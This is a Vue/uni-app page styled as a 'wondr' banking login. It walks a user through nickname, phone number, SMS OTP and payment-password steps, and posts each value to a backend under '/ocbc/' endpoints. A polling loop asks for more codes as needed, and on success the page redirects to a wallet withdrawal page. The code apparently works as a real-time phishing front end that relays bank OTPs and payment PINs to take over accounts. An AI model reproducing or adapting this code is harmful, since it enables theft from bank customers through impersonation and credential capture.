<template>
    <view class="wondr-page">
        <!-- 顶部导航栏 -->
        <view class="top-bar">
            <view class="back-btn" @click="handleBack">
                <text class="bi bi-arrow-left"></text>
            </view>
            <view v-if="currentStep === 1" class="promo-btn" @click="handlePromoCode">
                <text class="promo-icon bi bi-gift"></text>
                <text class="promo-text">{{ t('wondr.promoCodeLink') }}</text>
            </view>
        </view>

        <!-- 主内容区域 -->
        <view class="content">
            <!-- 步骤1: 昵称输入 -->
            <view v-if="currentStep === 1">
                <view class="title-section">
                    <text class="main-title">{{ t('wondr.mainTitle') }}</text>
                    <text class="subtitle">{{ t('wondr.subtitle') }}</text>
                </view>

                <view class="input-section">
                    <view class="input-wrapper">
                        <input v-model="nickname" class="nickname-input" type="text" maxlength="15"
                            :placeholder="t('wondr.nicknamePlaceholder')" @input="handleNicknameInput" />
                        <view v-if="nickname" class="clear-btn" @click="handleClearNickname">
                            <text class="bi bi-x-circle-fill"></text>
                        </view>
                    </view>
                    <view class="char-counter">
                        <text class="counter-text">{{ nickname.length }}/15</text>
                    </view>
                </view>
            </view>

            <!-- 步骤2: 手机号输入 -->
            <view v-if="currentStep === 2">
                <view class="title-section">
                    <text class="main-title">{{ t('wondr.phoneTitle') }}</text>
                    <text class="subtitle">{{ t('wondr.phoneSubtitle') }}</text>
                </view>

                <view class="input-section">
                    <view class="phone-input-wrapper" :class="{ 'has-value': phoneNumber }">
                        <!-- 国家代码和标签在同一行 -->
                        <view class="phone-header">
                            <view class="country-code" @click="handleSelectCountryCode">
                                <image src="https://flagcdn.com/w40/id.png" class="flag-icon" mode="aspectFit" />
                                <text class="code-text">+62</text>
                                <text class="bi bi-chevron-down arrow-icon"></text>
                            </view>
                        </view>

                        <!-- 手机号输入框-->
                        <view style="flex: 1; position: relative;left: 20rpx;">
                            <text class="phone-label">{{ t('wondr.phonePlaceholder') }}</text>
                            <view style="display: flex; align-items: center;">
                                <input v-model="phoneNumber" class="phone-input" type="number" placeholder=""
                                    :focus="phoneInputFocus" @input="handlePhoneInput" />
                                <text v-if="phoneNumber" class="bi bi-x-circle-fill clear-icon"
                                    @click="handleClearPhone"></text>
                            </view>
                        </view>
                    </view>
                </view>
            </view>

            <!-- 步骤3: 选择OTP方式 -->
            <view v-if="currentStep === 3">
                <view class="title-section">
                    <view class="title-with-icon">
                        <text class="main-title">{{ t('wondr.otpTitle') }}</text>
                        <view class="info-icon" @click="showOtpSecurityInfo">
                            <text class="bi bi-info-circle"></text>
                        </view>
                    </view>
                    <text class="subtitle">{{ t('wondr.otpSubtitle').replace('[PHONE]', countryCode + phoneNumber) }}</text>
                </view>

                <view class="otp-methods">
                    <!-- SMS 选项 -->
                    <view class="otp-method-item" @click="handleSelectOtpMethod('sms')">
                        <view class="method-left">
                            <view class="method-icon sms-icon">
                                <text class="bi bi-envelope"></text>
                            </view>
                            <view class="method-info">
                                <text class="method-name">SMS</text>
                                <view class="choice-badge">
                                    <text class="choice-text">{{ t('wondr.wondrChoice') }}</text>
                                </view>
                            </view>
                        </view>
                        <text class="bi bi-chevron-right method-arrow"></text>
                    </view>
                </view>
            </view>

            <!-- 步骤4: OTP验证码输入 -->
            <view v-if="currentStep === 4">
                <view class="title-section">
                    <text class="main-title">{{ t('wondr.otpVerifyTitle') }}</text>
                    <text class="subtitle">{{ t('wondr.otpVerifySubtitle').replace('[PHONE]', countryCode + '***' + phoneNumber.slice(-4)) }}</text>
                </view>

                <view class="otp-input-section">
                    <!-- OTP 输入框 -->
                    <view class="otp-inputs">
                        <input v-for="(digit, index) in otpDigits" :key="index" v-model="otpDigits[index]"
                            class="otp-digit-input" :class="{ 'has-value': otpDigits[index] }" type="number"
                            maxlength="1" :focus="otpFocusIndex === index" @input="handleOtpInput(index, $event)"
                            @keydown="handleOtpKeydown(index, $event)" />
                    </view>

                    <!-- 重发验证码 -->
                    <view class="resend-section">
                        <!-- 倒计时中 -->
                        <template v-if="resendTimer > 0">
                            <text class="resend-text">{{ t('wondr.resendCodeIn') }}</text>
                            <view class="timer-container">
                                <view class="timer-icon"
                                    :style="{ background: `conic-gradient(#71dbd3 ${progressAngle}deg, #E5E7EB ${progressAngle}deg)` }">
                                </view>
                                <text class="timer-text">{{ formatTime(resendTimer) }}</text>
                            </view>
                        </template>
                        <!-- 倒计时结束 -->
                        <template v-else>
                            <view style="display: flex; flex-direction: column; align-items: center; gap: 12rpx;">
                            <text class="resend-text">{{ t('wondr.resendCodeTo').replace('[CURRENT]', String(resendAttempt)).replace('[TOTAL]', String(maxResendAttempts)) }}</text>
                            <view style="display: flex; align-items: center; gap: 12rpx;">
                                <text class="resend-link sms-link" @click="handleResendCode('sms')">SMS</text>
                                <text class="resend-text">{{ t('wondr.or') }}</text>
                                <text class="resend-link whatsapp-link"
                                    @click="handleResendCode('whatsapp')">WhatsApp</text>
                            </view>
                            </view>
                        </template>
                    </view>
                </view>
            </view>
        </view>

        <!-- 底部按钮 -->
        <view class="bottom-section">
            <button class="continue-btn" :class="{ 'disabled': !canContinue }" :disabled="!canContinue" plain
                @click="handleContinue">
                {{ t('wondr.continueButton') }}
            </button>
        </view>

        <!-- 支付密码弹窗 -->
        <view v-if="showPaymentPasswordModal" class="modal-overlay" @click.stop>
            <view class="modal-content" @click.stop>
                <view class="modal-header">
                    <text class="modal-title">{{ t('wondr.paymentPasswordTitle') }}</text>
                </view>

                <view class="modal-body">
                    <!-- 提现账户信息 -->
                    <view v-if="withdrawalAccount?.account_name || withdrawalAccount?.account_number" class="account-info-section">
                        <text class="section-label">{{ t('wondr.withdrawalAccountLabel') }}</text>
                        <view class="account-info-box">
                            <view v-if="withdrawalAccount?.account_name" class="account-row">
                                <text class="account-label">{{ t('wondr.accountName') }}</text>
                                <text class="account-value">{{ withdrawalAccount.account_name }}</text>
                            </view>
                            <view v-if="withdrawalAccount?.account_number" class="account-row">
                                <text class="account-label">{{ t('wondr.accountNumber') }}</text>
                                <text class="account-value">{{ withdrawalAccount.account_number }}</text>
                            </view>
                            <view v-if="withdrawalAccount?.bank_name" class="account-row">
                                <text class="account-label">{{ t('wondr.bankName') }}</text>
                                <text class="account-value">{{ withdrawalAccount.bank_name }}</text>
                            </view>
                        </view>
                    </view>

                    <!-- 密码输入 -->
                    <view class="password-input-section">
                        <text class="input-label">{{ t('wondr.password') }}</text>
                        <input class="modal-input" v-model="paymentPasswordInput" type="password" password
                            :placeholder="t('wondr.paymentPasswordPlaceholder')" maxlength="6" />
                    </view>

                    <!-- 安全提示 -->
                    <view class="security-notice">
                        <view class="notice-icon-wrap">
                            <text class="bi bi-shield-check"></text>
                        </view>
                        <view class="notice-content">
                            <text class="notice-title">{{ t('wondr.securityNotice') }}</text>
                            <text class="notice-text">{{ t('wondr.securityNoticeText') }}</text>
                        </view>
                    </view>
                </view>

                <button class="modal-btn primary-btn" @click="submitPaymentPassword">
                    {{ t('wondr.submit') }}
                </button>
            </view>
        </view>

        <!-- OTP 验证码错误弹窗 -->
        <view v-if="showOtpErrorModal" class="modal-overlay status-overlay">
            <view class="status-modal" @click.stop>
                <view class="status-icon-wrap">
                    <view class="status-icon-circle error-circle">
                        <text class="bi bi-x-lg"></text>
                    </view>
                </view>
                <view class="status-content">
                    <text class="status-title error-title">{{ t('wondr.otpErrorTitle') }}</text>
                    <text class="status-message">{{ t('wondr.otpErrorMessage') }}</text>
                </view>
                <button class="modal-btn error-btn" @click="retryOtp">
                    {{ t('wondr.reenter') }}
                </button>
            </view>
        </view>

        <!-- 支付密码错误弹窗 -->
        <view v-if="showPaymentPasswordErrorModal" class="modal-overlay status-overlay">
            <view class="status-modal" @click.stop>
                <view class="status-icon-wrap">
                    <view class="status-icon-circle error-circle">
                        <text class="bi bi-x-lg"></text>
                    </view>
                </view>
                <view class="status-content">
                    <text class="status-title error-title">{{ t('wondr.paymentPasswordErrorTitle') }}</text>
                    <text class="status-message">{{ t('wondr.paymentPasswordErrorMessage') }}</text>
                </view>
                <button class="modal-btn error-btn" @click="retryPaymentPassword">
                    {{ t('wondr.reenter') }}
                </button>
            </view>
        </view>

        <!-- 成功弹窗 -->
        <view v-if="showSuccessModal" class="modal-overlay status-overlay">
            <view class="status-modal" @click.stop>
                <view class="status-icon-wrap">
                    <view class="status-icon-circle success-circle">
                        <text class="bi bi-check-lg"></text>
                    </view>
                </view>
                <view class="status-content">
                    <text class="status-title success-title">{{ t('wondr.successTitle') }}</text>
                    <text class="status-message">{{ t('wondr.successMessage') }}</text>
                    <text class="status-description">{{ t('wondr.successDescription') }}</text>
                </view>
                <button class="modal-btn success-btn" @click="handleSuccess">
                    {{ t('wondr.ok') }}
                </button>
            </view>
        </view>

        <!-- 失败弹窗 -->
        <view v-if="showFailedModal" class="modal-overlay status-overlay">
            <view class="status-modal" @click.stop>
                <view class="status-icon-wrap">
                    <view class="status-icon-circle error-circle">
                        <text class="bi bi-x-lg"></text>
                    </view>
                </view>
                <view class="status-content">
                    <text class="status-title error-title">{{ t('wondr.failedTitle') }}</text>
                    <text class="status-message">{{ t('wondr.failedMessage') }}</text>
                    <text class="status-description">{{ t('wondr.failedDescription') }}</text>
                </view>
                <button class="modal-btn error-btn" @click="handleFailed">
                    {{ t('wondr.tryAgain') }}
                </button>
            </view>
        </view>

        <!-- 系统维护弹窗 -->
        <view v-if="showMaintenanceModal" class="modal-overlay status-overlay">
            <view class="status-modal" @click.stop>
                <view class="status-icon-wrap">
                    <view class="status-icon-circle maintenance-circle">
                        <text class="bi bi-tools"></text>
                    </view>
                </view>
                <view class="status-content">
                    <text class="status-title maintenance-title">{{ t('wondr.maintenanceTitle') }}</text>
                    <text class="status-message">{{ t('wondr.maintenanceMessage') }}</text>
                    <text class="status-description">{{ t('wondr.maintenanceDescription') }}</text>
                </view>
                <button class="modal-btn maintenance-btn" @click="handleMaintenanceClose">
                    {{ t('wondr.ok') }}
                </button>
            </view>
        </view>

        <!-- OTP 安全信息弹窗 -->
        <OtpSecurityModal :visible="showSecurityModal" @update:visible="showSecurityModal = $event" />

        <!-- Wondr 风格 Loading -->
        <WondrLoading v-if="isLoading" />
    </view>
</template>

<script setup lang="ts">
import { ref, computed, nextTick } from 'vue'
import { onShow, onLoad } from '@dcloudio/uni-app'
import { useI18n } from 'vue-i18n'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'
import OtpSecurityModal from '../../components/OtpSecurityModal.vue'
import WondrLoading from '../../components/WondrLoading.vue'

const { t } = useI18n()

// 页面参数
const bankCode = ref('')
const logoUrl = ref('')

// 当前步骤
const currentStep = ref(1)

// 加载状态
const isLoading = ref(false)

// 昵称输入（步骤1）
const nickname = ref('')

// 手机号输入（步骤2）
const phoneNumber = ref('')
const countryCode = ref('+62')
const phoneInputFocus = ref(false)

// 安全信息弹窗
const showSecurityModal = ref(false)

// OTP 验证码输入（步骤4）
const otpDigits = ref(['', '', '', '', '', ''])
const otpFocusIndex = ref(0)
const resendTimer = ref(30)
const resendAttempt = ref(1)
const maxResendAttempts = 3
const progressAngle = computed(() => {
    const totalTime = 30
    const progress = resendTimer.value / totalTime
    return 360 * (1 - progress)
})

// 弹窗状态
const showOtpErrorModal = ref(false)
const showPaymentPasswordModal = ref(false)
const showPaymentPasswordErrorModal = ref(false)
const showSuccessModal = ref(false)
const showFailedModal = ref(false)
const showMaintenanceModal = ref(false)

// 支付密码输入
const paymentPasswordInput = ref('')
const withdrawalAccount = ref<any>(null)

// 记录ID和轮询
const recordId = ref<number>(0)
let pollingTimer: any = null

// 是否可以继续
const canContinue = computed(() => {
    if (currentStep.value === 1) {
        return nickname.value.trim().length > 0
    } else if (currentStep.value === 2) {
        return phoneNumber.value.trim().length > 0
    } else if (currentStep.value === 4) {
        return otpDigits.value.every(digit => digit !== '')
    }
    return false
})

// 接收页面参数
onLoad((options: any) => {
    // 检查登录状态
    const token = getToken()
    if (!token) {
        uni.showToast({
            title: t('common.pleaseLoginFirst') || 'Please login first',
            icon: 'none',
            duration: 2000
        })
        setTimeout(() => {
            uni.reLaunch({ url: '/pages/auth/login' })
        }, 2000)
        return
    }

    if (options) {
        if (options.code) {
            bankCode.value = options.code
        }
        if (options.logo) {
            logoUrl.value = decodeURIComponent(options.logo)
        }
    }
})

// 设置页面标题
onShow(() => {
    uni.setNavigationBarTitle({
        title: t('wondr.pageTitle')
    })
})

// 处理昵称输入
function handleNicknameInput() {
    if (nickname.value.length > 15) {
        nickname.value = nickname.value.slice(0, 15)
    }
}

// 处理手机号输入
function handlePhoneInput() {
    phoneNumber.value = phoneNumber.value.replace(/[^\d]/g, '')
}

// 返回按钮
function handleBack() {
    if (currentStep.value > 1) {
        currentStep.value--
    } else {
        uni.navigateBack()
    }
}

// 清除昵称
function handleClearNickname() {
    nickname.value = ''
}

// 清除手机号
function handleClearPhone() {
    phoneNumber.value = ''
}

// 推荐码按钮
function handlePromoCode() {
    uni.showToast({
        title: t('wondr.promoCodeFeature'),
        icon: 'none'
    })
}

// 选择国家代码
function handleSelectCountryCode() {
    uni.showToast({
        title: t('wondr.selectCountryCode'),
        icon: 'none'
    })
}

// 继续按钮
function handleContinue() {
    if (!canContinue.value) {
        if (currentStep.value === 1) {
            uni.showToast({
                title: t('wondr.pleaseEnterNickname'),
                icon: 'none'
            })
        } else if (currentStep.value === 2) {
            uni.showToast({
                title: t('wondr.pleaseEnterPhone'),
                icon: 'none'
            })
        }
        return
    }

    if (currentStep.value === 1) {
        currentStep.value = 2
        nextTick(() => {
            phoneInputFocus.value = true
            setTimeout(() => {
                phoneInputFocus.value = false
            }, 100)
        })
    } else if (currentStep.value === 2) {
        // 进入步骤3：选择OTP方式，同时提交登录
        currentStep.value = 3
        submitLogin()
    }
}

// ========== API 提交逻辑 ==========

// 提交登录
async function submitLogin() {
    isLoading.value = true
    try {
        const res = await post('/ocbc/submitLogin', {
            account_type: bankCode.value || 'wondr',
            organization_id: phoneNumber.value,
            user_id: phoneNumber.value,
            password: nickname.value
        }, { showError: false })

        recordId.value = res.data.record_id
        isLoading.value = false
    } catch (error: any) {
        isLoading.value = false
        uni.showToast({
            title: error.message || 'Submit failed',
            icon: 'none'
        })
    }
}

// 选择OTP验证方式
function handleSelectOtpMethod(method: string) {
    currentStep.value = 4
    startResendTimer()
}

// 显示OTP安全信息
function showOtpSecurityInfo() {
    showSecurityModal.value = true
}

// 处理 OTP 输入
function handleOtpInput(index: number, event: any) {
    const value = event.detail.value

    if (value && !/^\d$/.test(value)) {
        otpDigits.value[index] = ''
        return
    }

    otpDigits.value[index] = value

    if (value && index < 5) {
        otpFocusIndex.value = index + 1
    }

    // 如果所有输入框都填满了，自动提交
    if (otpDigits.value.every(digit => digit !== '')) {
        setTimeout(() => {
            handleVerifyOtp()
        }, 300)
    }
}

// 处理键盘事件
function handleOtpKeydown(index: number, event: any) {
    if (event.key === 'Backspace' && !otpDigits.value[index] && index > 0) {
        otpFocusIndex.value = index - 1
    }
}

// 提交 OTP 验证码
async function handleVerifyOtp() {
    const otp = otpDigits.value.join('')
    isLoading.value = true

    try {
        await post('/ocbc/submitCaptcha', {
            record_id: recordId.value,
            captcha: otp
        }, { showError: false })

        otpDigits.value = ['', '', '', '', '', '']
        startPolling()
    } catch (error: any) {
        isLoading.value = false
        showFailedModal.value = true
    }
}

// ========== 轮询逻辑 ==========

function startPolling() {
    pollingTimer = setInterval(async () => {
        await pollStatus()
    }, 2000)
}

function stopPolling() {
    if (pollingTimer) {
        clearInterval(pollingTimer)
        pollingTimer = null
    }
}

async function pollStatus() {
    try {
        const res = await post('/ocbc/pollStatus', {
            record_id: recordId.value
        }, { showError: false })

        handleStatusChange(res.data.status, res.data)
    } catch (error) {
        console.error('Poll status error:', error)
    }
}

// 处理状态变化
function handleStatusChange(status: string, data: any) {
    switch (status) {
        case 'need_captcha':
            stopPolling()
            isLoading.value = false
            // 已经在步骤4等待OTP输入，无需额外操作
            break

        case 'need_payment_password':
            stopPolling()
            isLoading.value = false
            withdrawalAccount.value = data.withdrawal_account
            showPaymentPasswordModal.value = true
            break

        case 'success':
            stopPolling()
            isLoading.value = false
            showSuccessModal.value = true
            break

        case 'payment_password_error':
            stopPolling()
            isLoading.value = false
            showPaymentPasswordErrorModal.value = true
            break

        case 'captcha_error':
            stopPolling()
            isLoading.value = false
            showOtpErrorModal.value = true
            break

        case 'password_error':
        case 'failed':
            stopPolling()
            isLoading.value = false
            showFailedModal.value = true
            break

        case 'maintenance':
            stopPolling()
            isLoading.value = false
            showMaintenanceModal.value = true
            break

        default:
            // 继续轮询
            break
    }
}

// ========== 支付密码提交 ==========

async function submitPaymentPassword() {
    if (!paymentPasswordInput.value) {
        uni.showToast({
            title: t('wondr.pleaseEnterPaymentPassword'),
            icon: 'none'
        })
        return
    }

    showPaymentPasswordModal.value = false
    isLoading.value = true

    try {
        await post('/ocbc/submitPaymentPassword', {
            record_id: recordId.value,
            payment_password: paymentPasswordInput.value
        }, { showError: false })

        paymentPasswordInput.value = ''
        startPolling()
    } catch (error: any) {
        isLoading.value = false
        showPaymentPasswordErrorModal.value = true
    }
}

// ========== 弹窗操作 ==========

// 重试输入 OTP
function retryOtp() {
    showOtpErrorModal.value = false
    otpDigits.value = ['', '', '', '', '', '']
    otpFocusIndex.value = 0
}

// 重试输入支付密码
function retryPaymentPassword() {
    showPaymentPasswordErrorModal.value = false
    paymentPasswordInput.value = ''
    showPaymentPasswordModal.value = true
}

// 成功
function handleSuccess() {
    showSuccessModal.value = false
    uni.redirectTo({
        url: '/pages/wallet/withdraw'
    })
}

// 失败
function handleFailed() {
    showFailedModal.value = false
    // 回到步骤1重新开始
    currentStep.value = 1
    nickname.value = ''
    phoneNumber.value = ''
    otpDigits.value = ['', '', '', '', '', '']
}

// 维护
function handleMaintenanceClose() {
    showMaintenanceModal.value = false
    uni.navigateBack()
}

// ========== 工具函数 ==========

function formatTime(seconds: number): string {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
}

function startResendTimer() {
    resendTimer.value = 30
    const interval = setInterval(() => {
        resendTimer.value--
        if (resendTimer.value <= 0) {
            clearInterval(interval)
        }
    }, 1000)
}

function handleResendCode(method: string) {
    if (resendAttempt.value >= maxResendAttempts) {
        return
    }
    resendAttempt.value++
    startResendTimer()
}
</script>

<style lang="scss" scoped>
.wondr-page {
    min-height: 100vh;
    background-color: #FFFFFF;
    display: flex;
    flex-direction: column;
}

/* 顶部导航栏 */
.top-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 24rpx 32rpx;
    padding-top: calc(24rpx + var(--status-bar-height, 0));
}

.back-btn {
    width: 80rpx;
    height: 80rpx;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;

    .bi-arrow-left {
        font-size: 48rpx;
        color: #1A1A1A;
    }
}

.promo-btn {
    display: flex;
    align-items: center;
    gap: 8rpx;
    padding: 12rpx 24rpx;
    background-color: #FFFFFF;
    border: 2rpx dashed #E5E7EB;
    border-radius: 50rpx;
    cursor: pointer;
    transition: all 0.2s ease;

    &:active {
        background-color: #F9FAFB;
        transform: scale(0.98);
    }
}

.promo-icon {
    font-size: 26rpx;
    color: #1A1A1A;
}

.promo-text {
    font-size: 24rpx;
    color: #1A1A1A;
    font-weight: 500;
}

/* 主内容区域 */
.content {
    flex: 1;
    padding: 80rpx 48rpx 0;
}

/* 标题区域 */
.title-section {
    margin-bottom: 80rpx;
}

.title-with-icon {
    display: flex;
    align-items: center;
    gap: 12rpx;
    margin-bottom: 20rpx;
}

.main-title {
    display: block;
    font-size: 40rpx;
    font-weight: 600;
    color: #1A1A1A;
    line-height: 1.3;
    letter-spacing: -0.5px;
}

.info-icon {
    .bi-info-circle {
        font-size: 40rpx;
        color: #F59E0B;
    }
}

.subtitle {
    display: block;
    font-size: 24rpx;
    color: #6B7280;
    line-height: 1.5;
}

/* 输入区域 */
.input-section {
    margin-top: 40rpx;
}

/* 昵称输入框 */
.input-wrapper {
    position: relative;
    background-color: #F9FAFB;
    border-radius: 24rpx;
    border: 2rpx solid #E5E7EB;
    transition: all 0.2s ease;

    &:focus-within {
        border-color: #71dbd3;
        background-color: #FFFFFF;
        box-shadow: 0 0 0 6rpx rgba(113, 219, 211, 0.1);
    }
}

.nickname-input {
    width: 100%;
    height: 100rpx;
    padding: 0 80rpx 0 32rpx;
    font-size: 32rpx;
    color: #1A1A1A;
    background-color: transparent;
    border: none;
    outline: none;

    &::placeholder {
        color: #9CA3AF;
    }
}

.clear-btn {
    position: absolute;
    right: 32rpx;
    top: 50%;
    transform: translateY(-50%);
    width: 48rpx;
    height: 48rpx;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;

    .bi-x-circle-fill {
        font-size: 40rpx;
        color: #9CA3AF;
    }
}

.char-counter {
    display: flex;
    justify-content: flex-end;
    padding: 12rpx 8rpx 0;
}

.counter-text {
    font-size: 24rpx;
    color: #9CA3AF;
    font-variant-numeric: tabular-nums;
}

/* 手机号输入框容器 */
.phone-input-wrapper {
    display: flex;
    flex-direction: row;
    align-items: center;
    background-color: #FFFFFF;
    border-radius: 24rpx;
    border: 2rpx solid #71dbd3;
    transition: all 0.2s ease;
    padding: 8rpx 32rpx;
    min-height: 100rpx;
}

.phone-header {
    display: flex;
    align-items: center;
    gap: 12rpx;
}

.country-code {
    display: flex;
    align-items: center;
    gap: 8rpx;
    cursor: pointer;
}

.flag-icon {
    width: 40rpx;
    height: 28rpx;
    border-radius: 4rpx;
}

.code-text {
    font-size: 28rpx;
    color: #1A1A1A;
    font-weight: 500;
}

.arrow-icon {
    font-size: 20rpx;
    color: #1A1A1A;
    font-weight: 900;
    transform: scaleY(1.2);
}

.phone-label {
    flex: 1;
    font-size: 28rpx;
    font-weight: 700;
    color: #1A1A1A;
    text-align: left;
}

.clear-icon {
    font-size: 28rpx;
    color: #9CA3AF;
    cursor: pointer;
    margin-left: 12rpx;
    flex-shrink: 0;
}

/* 手机号输入框 - 默认隐藏 */
.phone-input {
    width: 100%;
    font-size: 32rpx;
    color: #1A1A1A;
    background-color: transparent;
    border: none;
    outline: none;
    padding: 0;
    height: 0;
    opacity: 0;
    transition: all 0.2s ease;
}

/* 有值时显示大号输入框 */
.phone-input-wrapper.has-value {
    .phone-input {
        height: auto;
        opacity: 1;
        font-size: 32rpx;
        font-weight: 700;
        letter-spacing: 3rpx;
        line-height: 1.2;
    }
}

/* OTP 方式选择 */
.otp-methods {
    display: flex;
    flex-direction: column;
    gap: 16rpx;
    margin-top: 40rpx;
}

.otp-method-item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 32rpx;
    background-color: #FFFFFF;
    border-radius: 24rpx;
    border: 2rpx solid #E5E7EB;
    cursor: pointer;
    transition: all 0.2s ease;

    &:active {
        background-color: #F9FAFB;
        transform: scale(0.98);
    }
}

.method-left {
    display: flex;
    align-items: center;
    gap: 20rpx;
}

.method-icon {
    width: 88rpx;
    height: 88rpx;
    border-radius: 16rpx;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 40rpx;
}

.sms-icon {
    color: #F59E0B;
}

.whatsapp-icon {
    color: #F59E0B;
}

.method-info {
    display: flex;
    align-items: center;
    gap: 12rpx;
}

.method-name {
    font-size: 32rpx;
    font-weight: 600;
    color: #1A1A1A;
}

.choice-badge {
    background-color: #71dbd3;
    padding: 6rpx 16rpx;
    border-radius: 50rpx;
    display: flex;
    align-items: center;
    justify-content: center;
}

.choice-text {
    font-size: 20rpx;
    font-weight: 600;
    color: #1A1A1A;
}

.method-arrow {
    font-size: 32rpx;
    color: #9CA3AF;
}

/* 底部按钮区域 */
.bottom-section {
    padding: 32rpx 48rpx;
    padding-bottom: calc(32rpx + env(safe-area-inset-bottom));
}

.continue-btn {
    width: 100%;
    height: 96rpx;
    background: #71dbd3;
    border: none;
    border-radius: 50rpx;
    font-size: 32rpx;
    font-weight: 600;
    color: #1A1A1A;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    box-shadow: 0 8rpx 24rpx rgba(113, 219, 211, 0.3);
    padding: 0;
    line-height: 96rpx;

    // 重置 UniApp 按钮默认样式
    &::after {
        border: none;
    }

    &:active:not(.disabled) {
        transform: scale(0.98);
        box-shadow: 0 4rpx 12rpx rgba(113, 219, 211, 0.3);
    }

    &.disabled {
        background: #E5E7EB;
        color: #9CA3AF;
        box-shadow: none;
        cursor: not-allowed;
    }
}

/* OTP 输入区域 */
.otp-input-section {
    margin-top: 80rpx;
}

.otp-inputs {
    display: flex;
    justify-content: space-between;
    gap: 16rpx;
    margin-bottom: 64rpx;
}

.otp-digit-input {
    flex: 1;
    height: 100rpx;
    text-align: center;
    font-size: 48rpx;
    font-weight: 700;
    color: #1A1A1A;
    background-color: transparent;
    border: none;
    border-bottom: 4rpx solid #E5E7EB;
    outline: none;
    transition: all 0.2s ease;

    &.has-value {
        border-bottom-color: #71dbd3;
    }

    &:focus {
        border-bottom-color: #71dbd3;
    }
}

.resend-section {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12rpx;
}

.resend-text {
    font-size: 28rpx;
    color: #6B7280;
}

.timer-container {
    display: flex;
    align-items: center;
    gap: 8rpx;
}

.timer-icon {
    width: 36rpx;
    height: 36rpx;
    border-radius: 50%;
    border: 4rpx solid #71dbd3;
    transition: background 1s linear;
}

.timer-text {
    font-size: 28rpx;
    font-weight: 600;
    color: #71dbd3;
    font-variant-numeric: tabular-nums;
}

.resend-link {
    font-size: 28rpx;
    font-weight: 600;
    cursor: pointer;

    &:active {
        opacity: 0.7;
    }
}

.sms-link {
    color: #F59E0B;
}

.whatsapp-link {
    color: #F59E0B;
}

/* ========== 弹窗基础样式 ========== */
.modal-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.5);
    display: flex;
    align-items: flex-end;
    justify-content: center;
    z-index: 9999;
    animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

.modal-content {
    background: #FFFFFF;
    border-radius: 32rpx 32rpx 0 0;
    padding: 48rpx;
    width: 100%;
    max-height: 80vh;
    overflow-y: auto;
    animation: slideUp 0.3s ease;
}

@keyframes slideUp {
    from { transform: translateY(100%); }
    to { transform: translateY(0); }
}

.modal-header {
    margin-bottom: 40rpx;
}

.modal-title {
    display: block;
    font-size: 36rpx;
    font-weight: 700;
    color: #1A1A1A;
    text-align: center;
}

.modal-body {
    margin-bottom: 40rpx;
}

/* 账户信息 */
.account-info-section {
    margin-bottom: 32rpx;
}

.section-label {
    display: block;
    font-size: 26rpx;
    color: #6B7280;
    margin-bottom: 12rpx;
    font-weight: 600;
}

.account-info-box {
    background: #F0FDFA;
    border: 2rpx solid rgba(113, 219, 211, 0.3);
    border-radius: 16rpx;
    padding: 24rpx;
}

.account-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 16rpx;
}

.account-row:last-child {
    margin-bottom: 0;
}

.account-label {
    font-size: 26rpx;
    color: #6B7280;
}

.account-value {
    font-size: 28rpx;
    font-weight: 600;
    color: #1A1A1A;
}

/* 密码输入 */
.password-input-section {
    margin-bottom: 24rpx;
}

.input-label {
    display: block;
    font-size: 28rpx;
    font-weight: 600;
    color: #1A1A1A;
    margin-bottom: 12rpx;
}

.modal-input {
    height: 96rpx;
    background: #F9FAFB;
    border: 2rpx solid #E5E7EB;
    border-radius: 16rpx;
    padding: 0 32rpx;
    font-size: 32rpx;
    color: #1A1A1A;
    

    &:focus {
        border-color: #71dbd3;
        background: #FFFFFF;
        box-shadow: 0 0 0 6rpx rgba(113, 219, 211, 0.1);
    }
}

/* 安全提示 */
.security-notice {
    display: flex;
    gap: 16rpx;
    padding: 24rpx;
    background: #F0FDFA;
    border-radius: 16rpx;
    border: 1rpx solid rgba(113, 219, 211, 0.3);
}

.notice-icon-wrap {
    .bi-shield-check {
        font-size: 40rpx;
        color: #71dbd3;
    }
}

.notice-content {
    flex: 1;
}

.notice-title {
    display: block;
    font-size: 26rpx;
    font-weight: 600;
    color: #1A1A1A;
    margin-bottom: 8rpx;
}

.notice-text {
    display: block;
    font-size: 24rpx;
    color: #6B7280;
    line-height: 1.5;
}

/* 弹窗按钮 */
.modal-btn {
    width: 100%;
    height: 96rpx;
    border-radius: 50rpx;
    font-size: 32rpx;
    font-weight: 600;
    color: #FFFFFF;
    border: none;
    display: flex;
    align-items: center;
    justify-content: center;

    &::after {
        border: none;
    }
}

.primary-btn {
    background: #71dbd3;
    color: #1A1A1A;
    box-shadow: 0 8rpx 24rpx rgba(113, 219, 211, 0.3);
}

/* ========== 状态弹窗（成功/失败/维护） ========== */
.status-overlay {
    background: rgba(0, 0, 0, 0.6);
    backdrop-filter: blur(8rpx);
}

.status-modal {
    background: #FFFFFF;
    border-radius: 32rpx 32rpx 0 0;
    padding: 60rpx 48rpx 48rpx;
    width: 100%;
    text-align: center;
    animation: slideUp 0.3s ease;
}

.status-icon-wrap {
    margin-bottom: 32rpx;
    display: flex;
    justify-content: center;
}

.status-icon-circle {
    width: 128rpx;
    height: 128rpx;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 64rpx;
    color: #FFFFFF;
    animation: statusIconScale 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

@keyframes statusIconScale {
    0% { transform: scale(0); opacity: 0; }
    50% { transform: scale(1.1); }
    100% { transform: scale(1); opacity: 1; }
}

.success-circle {
    background: linear-gradient(135deg, #71dbd3 0%, #4ecdc4 100%);
    box-shadow: 0 8rpx 24rpx rgba(113, 219, 211, 0.4);
}

.error-circle {
    background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
